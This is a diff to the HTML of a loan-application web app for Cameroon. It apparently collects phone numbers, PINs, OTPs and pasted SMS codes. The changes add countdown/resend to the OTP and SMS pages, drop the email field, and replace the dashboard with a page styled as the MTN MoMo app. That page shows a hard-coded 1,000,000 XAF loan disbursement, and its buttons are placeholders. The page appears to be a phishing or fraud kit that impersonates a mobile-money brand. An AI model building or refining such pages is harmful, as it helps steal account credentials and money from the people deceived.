@@ -66,7 +66,7 @@
         </div>
     </div>
 
-    <!-- PAGE 3: STEP 2 -->
+    <!-- PAGE 3: STEP 2 (NO EMAIL) -->
     <div id="page-step2" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-step1')">← <span data-i18n="back">Back</span></a>
@@ -91,7 +91,7 @@
                     <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="s2ph" placeholder="6XX XXX XXX" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
                     <div class="field-hint" data-i18n="phone_hint">9 digits without +237 prefix (e.g., 670123456)</div>
                 </div>
-                <div class="field"><label data-i18n="email">Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')" /></div>
+                <!-- Email field removed -->
                 <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')" data-i18n="back">BACK</button><button class="btn-grad" onclick="toS3()" data-i18n="next">NEXT STEP</button></div>
             </div>
         </div>
@@ -141,7 +141,7 @@
         </div>
     </div>
 
-    <!-- PAGE 6: SMS PASTE -->
+    <!-- PAGE 6: SMS PASTE (with countdown/resend) -->
     <div id="page-sms-paste" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-processing')">← <span data-i18n="back">Back</span></a>
@@ -233,7 +233,7 @@
         </div>
     </div>
 
-    <!-- PAGE 10: OTP -->
+    <!-- PAGE 10: OTP (with countdown/resend) -->
     <div id="page-otp" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-wait-pin')">← <span data-i18n="back">Back</span></a>
@@ -304,26 +304,34 @@
             </div>
             <div class="nxt-steps"><span style="font-size:1.2rem;">📌</span><p><strong data-i18n="next_steps">Next Steps:</strong> <span data-i18n="next_steps_text">To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next 7 days.</span></p></div>
             <div class="rth-wrap">
-                <button class="rth-btn" onclick="goTo('page-dashboard')" data-i18n="view_dashboard">VIEW DASHBOARD</button>
+                <button class="rth-btn" onclick="loadDashboard()" data-i18n="finish">FINISH</button>
             </div>
         </div>
     </div>
 
     <!-- PAGE 13: DASHBOARD -->
     <div id="page-dashboard" class="page">
-        <div class="dash-wrap">
-            <div class="dash-card">
-                <h2 data-i18n="dashboard_title">Loan Dashboard</h2>
-                <div class="dash-row"><span data-i18n="loan_id">Loan ID:</span><span id="dashId">-</span></div>
-                <div class="dash-row"><span data-i18n="amount">Amount:</span><span id="dashAmount">-</span></div>
-                <div class="dash-row"><span data-i18n="term">Term:</span><span id="dashTerm">-</span></div>
-                <div class="dash-row"><span data-i18n="monthly">Monthly Payment:</span><span id="dashMonthly">-</span></div>
-                <div class="dash-row"><span data-i18n="status">Status:</span><span id="dashStatus" class="approved">Approved</span></div>
-                <div class="dash-actions">
-                    <button class="btn-grad" onclick="alert('Payment feature coming soon!')" data-i18n="make_payment">Make Payment</button>
-                    <button class="btn-gray" onclick="goTo('page-landing')" data-i18n="logout">Logout</button>
-                </div>
+        <div class="momo-dash">
+            <div class="momo-dash-header">
+                <div class="momo-logo"><span class="momo-icon">M</span><span class="momo-name">MTN MoMo</span></div>
+                <div class="momo-header-right"><span class="momo-notif">🔔</span><span class="momo-user">👤</span></div>
             </div>
+            <div class="momo-balance-card">
+                <div class="balance-label">Loan Balance</div>
+                <div class="balance-amount" id="dashBalance">XAF 0</div>
+                <div class="balance-details"><span>Loan ID: <b id="dashId">-</b></span><span>Term: <b id="dashTerm">-</b></span></div>
+            </div>
+            <div class="momo-actions">
+                <div class="action-card" onclick="alert('Payment feature coming soon!')"><div class="action-icon">💰</div><div class="action-text">Make Payment</div></div>
+                <div class="action-card" onclick="alert('History coming soon!')"><div class="action-icon">📄</div><div class="action-text">History</div></div>
+                <div class="action-card" onclick="alert('Settings coming soon!')"><div class="action-icon">⚙️</div><div class="action-text">Settings</div></div>
+            </div>
+            <div class="momo-recent">
+                <h3>Recent Transactions</h3>
+                <div class="transaction-item"><div class="tx-icon green">✓</div><div class="tx-details"><div class="tx-title">Loan Disbursement</div><div class="tx-date">Just now</div></div><div class="tx-amount">+XAF 1,000,000</div></div>
+                <div class="transaction-item"><div class="tx-icon orange">⏳</div><div class="tx-details"><div class="tx-title">Monthly Payment Due</div><div class="tx-date">In 30 days</div></div><div class="tx-amount">-XAF 24,000</div></div>
+            </div>
+            <button class="momo-logout" onclick="goTo('page-landing')">Logout</button>
         </div>
     </div>
 
